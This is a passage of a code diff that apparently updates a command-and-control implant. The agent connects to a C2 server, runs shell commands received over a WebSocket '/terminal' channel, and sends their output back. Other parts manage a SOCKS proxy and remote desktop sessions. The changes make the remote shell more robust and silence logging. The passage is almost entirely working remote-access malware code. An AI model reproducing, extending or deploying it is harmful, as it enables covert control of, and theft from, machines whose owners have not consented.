                         'id': pid,
                         'command': info['command'],
                         'start_time': info['start_time']
                     }})
                 self.socket.emit('process_list', {{'processes': process_list}}, namespace='/terminal')
-            
+
             @self.socket.on('force_kill', namespace='/terminal')
             def on_force_kill(data):
                 self._log_info("[!] Received forced kill command")
@@ -3263,25 +3402,38 @@ class WebSocketClient:
             @self.socket.on('stop_keep_alive', namespace='/terminal')
             def on_stop_keep_alive(data):
                 self._log_info("[!] Received stop keep-alive command")
-                # Stop the keep-alive thread
                 self.keep_alive_running = False
 
     def connect(self):
+        if self.connected and self.socket and self.socket.connected:
+            if self.namespace == '/terminal':
+                try:
+                    self.socket.emit('command_result', {{
+                        'agent_id': self.agent_id,
+                        'output': '',
+                        'error': '',
+                        'current_dir': self.current_dir
+                    }}, namespace='/terminal')
+                except Exception:
+                    pass
+            return True
+
+        self.disconnect()
+
         try:
             self.logger.info(f"Connecting to WebSocket at {{self.server_url}} namespace {{self.namespace}}")
-            
+
             self.socket = socketio.Client(
                 ssl_verify=False,
                 reconnection=True,
-                reconnection_attempts=0,  # Unlimited reconnection attempts
+                reconnection_attempts=0,
                 reconnection_delay=3000,
-                logger=True,
-                engineio_logger=True
+                logger=False,
+                engineio_logger=False
             )
 
             self._setup_event_handlers()
-            # Add connection verification timeout
-            connection_timeout = 10  # seconds
+            connection_timeout = 10
             connected_event = threading.Event()
 
             @self.socket.on('connect', namespace=self.namespace)
@@ -3297,6 +3449,13 @@ class WebSocketClient:
                     }}
                     self.socket.emit('agent_connect', auth_data, namespace=self.namespace)
                     self.connected = True
+                    if self.namespace == '/terminal':
+                        self.socket.emit('command_result', {{
+                            'agent_id': self.agent_id,
+                            'output': '',
+                            'error': '',
+                            'current_dir': self.current_dir
+                        }}, namespace='/terminal')
                     connected_event.set()
                 except Exception as e:
                     self.logger.error(f"Authentication failed: {{str(e)}}")
@@ -3306,19 +3465,15 @@ class WebSocketClient:
                 self.logger.warning(f"WebSocket disconnected from {{self.namespace}}")
                 self.connected = False
 
-            # Start keep-alive ping thread
             def keep_alive_loop():
                 while self.connected:
                     try:
                         self.socket.emit('keep_alive', {{'agent_id': self.agent_id}}, namespace=self.namespace)
-                        self.logger.debug("Sent keep_alive ping")
-                    except Exception as e:
-                        self.logger.error(f"Failed to send keep_alive ping: {{str(e)}}")
+                    except Exception:
+                        pass
                     time.sleep(25)
             threading.Thread(target=keep_alive_loop, daemon=True).start()
 
-            # Connect with timeout
-            # Parse server_url to separate base URL and socket.io path
             from urllib.parse import urlparse
             parsed_url = urlparse(self.server_url)
             base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
@@ -3331,13 +3486,14 @@ class WebSocketClient:
                     'User-Agent': self.config.USER_AGENT,
                     'X-Agent-ID': self.agent_id
                 }},
-                namespaces=[self.namespace]
+                namespaces=[self.namespace],
+                wait_timeout=10
             )
 
             if not connected_event.wait(connection_timeout):
                 self.logger.error("WebSocket connection timed out")
                 return False
-            
+
             self.logger.info("WebSocket connection established successfully")
             return True
 
@@ -3347,106 +3503,87 @@ class WebSocketClient:
 
     def _execute_command(self, command):
         try:
-            self.logger.info(f"Executing: {{command}}")
-            
-            # Handle CD command separately
-            if command.lower().startswith('cd '):
-                new_dir = command[3:].strip()
+            cmd_stripped = (command or '').strip()
+            if not cmd_stripped:
+                return {{'output': '', 'error': '', 'current_dir': self.current_dir}}
+
+            self.logger.info(f"Executing: {{cmd_stripped}}")
+            cmd_lower = cmd_stripped.lower()
+
+            # Handle directory change commands (cd, cd /d, cd.., cd\, drive letters like C: or D:)
+            is_drive_switch = (
+                platform.system() == 'Windows'
+                and len(cmd_stripped) == 2
+                and cmd_stripped[0].isalpha()
+                and cmd_stripped[1] == ':'
+            )
+            if is_drive_switch or cmd_lower in ('cd', 'chdir', 'cd..', 'cd\\', 'cd/') or cmd_lower.startswith(('cd ', 'chdir ')):
                 try:
-                    if new_dir:
-                        os.chdir(new_dir)
+                    if is_drive_switch:
+                        target_dir = cmd_stripped + '\\'
+                    elif cmd_lower in ('cd', 'chdir'):
+                        if platform.system() == 'Windows':
+                            return {{'output': self.current_dir, 'error': '', 'current_dir': self.current_dir}}
+                        target_dir = os.path.expanduser('~')
+                    elif cmd_lower == 'cd..':
+                        target_dir = '..'
+                    elif cmd_lower in ('cd\\', 'cd/'):
+                        target_dir = '\\' if platform.system() == 'Windows' else '/'
+                    else:
+                        raw_arg = cmd_stripped.split(None, 1)[1].strip()
+                        if raw_arg.lower().startswith('/d '):
+                            raw_arg = raw_arg[3:].strip()
+                        target_dir = os.path.expanduser(os.path.expandvars(raw_arg.strip('"')))
+
+                    if not os.path.isabs(target_dir):
+                        target_dir = os.path.abspath(os.path.join(self.current_dir, target_dir))
+                    os.chdir(target_dir)
                     self.current_dir = os.getcwd()
                     return {{
-                        'output': f"Current directory is now: {{self.current_dir}}",
+                        'output': '',
+                        'error': '',
                         'current_dir': self.current_dir
                     }}
                 except Exception as e:
                     return {{
+                        'output': '',
                         'error': str(e),
                         'current_dir': self.current_dir
                     }}
 
-            # Execute regular commands asynchronously using Popen
-            # This allows multiple commands to run in parallel without blocking
-            process_id = str(random.randint(10000, 99999))  # Unique ID for this command
-            
-            # Start the process
+            process_id = str(random.randint(10000, 99999))
             proc = subprocess.Popen(
-                command,
+                cmd_stripped,
                 shell=True,
                 cwd=self.current_dir,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+                stderr=subprocess.PIPE
             )
-            
-# Store the process for tracking
+
+            # Fast path: wait up to 1.5s synchronously so standard commands finish in a single round-trip
+            try:
+                out_bytes, err_bytes = proc.communicate(timeout=1.5)
+                return {{
+                    'output': self._decode_bytes(out_bytes),
+                    'error': self._decode_bytes(err_bytes),
+                    'current_dir': self.current_dir,
+                    'returncode': proc.returncode
+                }}
+            except subprocess.TimeoutExpired:
+                pass
+
+            # Long-running command: register and monitor asynchronously
             self.running_processes[process_id] = {{
                 'process': proc,
-                'command': command,
+                'command': cmd_stripped,
                 'start_time': time.time()
             }}
-            
-            # Also register in global registry for cross-command management
-            _register_process(process_id, proc, command)
-            
-            # Start a thread to monitor the process and send results when done
-            def monitor_process(pid, proc_obj):
-                try:
-                    # Wait for process to complete (with timeout)
-                    stdout, stderr = proc_obj.communicate(timeout=30)
-                    returncode = proc_obj.returncode
-                    
-                    # Get updated current directory
-                    current_dir = os.getcwd()
-                    
-                    # Send the result back via socket
-                    if self.socket and self.connected:
-                        try:
-                            self.socket.emit('command_result', {{
-                                'agent_id': self.agent_id,
-                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
-                                'output': stdout,
-                                'error': stderr,
-                                'current_dir': current_dir,
-                                'returncode': returncode
-                            }}, namespace='/terminal')
-                        except Exception as e:
-                            self.logger.error(f"Failed to emit command result: {{str(e)}}")
-                except subprocess.TimeoutExpired:
-                    proc_obj.kill()
-                    stdout, stderr = proc_obj.communicate()
-                    if self.socket and self.connected:
-                        try:
-                            self.socket.emit('command_result', {{
-                                'agent_id': self.agent_id,
-                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
-                                'output': stdout,
-                                'error': 'Command timed out after 30 seconds',
-                                'current_dir': os.getcwd(),
-                                'returncode': -1
-                            }}, namespace='/terminal')
-                        except Exception as e:
-                            self.logger.error(f"Failed to emit timeout result: {{str(e)}}")
-                except Exception as e:
-                    self.logger.error(f"Error monitoring process: {{str(e)}}")
-                finally:
-# Clean up the process from tracking
-                    if pid in self.running_processes:
-                        del self.running_processes[pid]
-                    
-                    # Also unregister from global registry
-                    _unregister_process(pid)
-            
-            # Start monitoring thread
-            threading.Thread(target=monitor_process, args=(process_id, proc), daemon=True).start()
-            
-            # Send immediate response with process_id so user knows it's running
+            _register_process(process_id, proc, cmd_stripped)
+
             if self.socket and self.connected:
                 try:
                     self.socket.emit('command_result', {{
                         'agent_id': self.agent_id,
-                        'command': command,
                         'output': '',
                         'error': '',
                         'current_dir': self.current_dir,
@@ -3455,15 +3592,40 @@ class WebSocketClient:
                     }}, namespace='/terminal')
                 except Exception as e:
                     self.logger.error(f"Failed to emit running status: {{str(e)}}")
-            
-            # Return immediately with running status
-            return {{
-                'output': '',
-                'error': '',
-                'current_dir': self.current_dir,
-                'running': True,
-                'process_id': process_id
-            }}
+
+            def monitor_process(pid, proc_obj):
+                try:
+                    out_bytes, err_bytes = proc_obj.communicate(timeout=300)
+                    returncode = proc_obj.returncode
+                    if self.socket and self.connected:
+                        self.socket.emit('command_result', {{
+                            'agent_id': self.agent_id,
+                            'output': self._decode_bytes(out_bytes),
+                            'error': self._decode_bytes(err_bytes),
+                            'current_dir': self.current_dir,
+                            'returncode': returncode,
+                            'finished_pid': pid
+                        }}, namespace='/terminal')
+                except subprocess.TimeoutExpired:
+                    proc_obj.kill()
+                    out_bytes, err_bytes = proc_obj.communicate()
+                    if self.socket and self.connected:
+                        self.socket.emit('command_result', {{
+                            'agent_id': self.agent_id,
+                            'output': self._decode_bytes(out_bytes),
+                            'error': f"Process {{pid}} timed out after 300 seconds",
+                            'current_dir': self.current_dir,
+                            'returncode': -1,
+                            'finished_pid': pid
+                        }}, namespace='/terminal')
+                except Exception as e:
+                    self.logger.error(f"Error monitoring process: {{str(e)}}")
+                finally:
+                    self.running_processes.pop(pid, None)
+                    _unregister_process(pid)
+
+            threading.Thread(target=monitor_process, args=(process_id, proc), daemon=True).start()
+            return None
 
         except Exception as e:
             return {{
@@ -4204,7 +4366,8 @@ class Agent:
                     return self.socks_proxy.stop()
             
             elif task_type == "remote_desktop":
-                action = task.get("action") or task.get("data", {{}}).get("action")
+                t_data = task.get("data", {{}}) if isinstance(task.get("data"), dict) else {{}}
+                action = task.get("action") or t_data.get("action")
                 if action == "start":
                     if not hasattr(self, 'remote_desktop_handler') or not self.remote_desktop_handler:
                         self.remote_desktop_handler = RemoteDesktopHandler(
@@ -4213,7 +4376,9 @@ class Agent:
                             self.config.C2_SERVER,
                             self.config
                         )
-                    if self.remote_desktop_handler.connect():
+                    req_quality = t_data.get("quality")
+                    req_fps = t_data.get("fps")
+                    if self.remote_desktop_handler.connect(quality=req_quality, fps=req_fps):
                         return {{
                             "status": "success",
                             "message": "Remote Desktop connected",
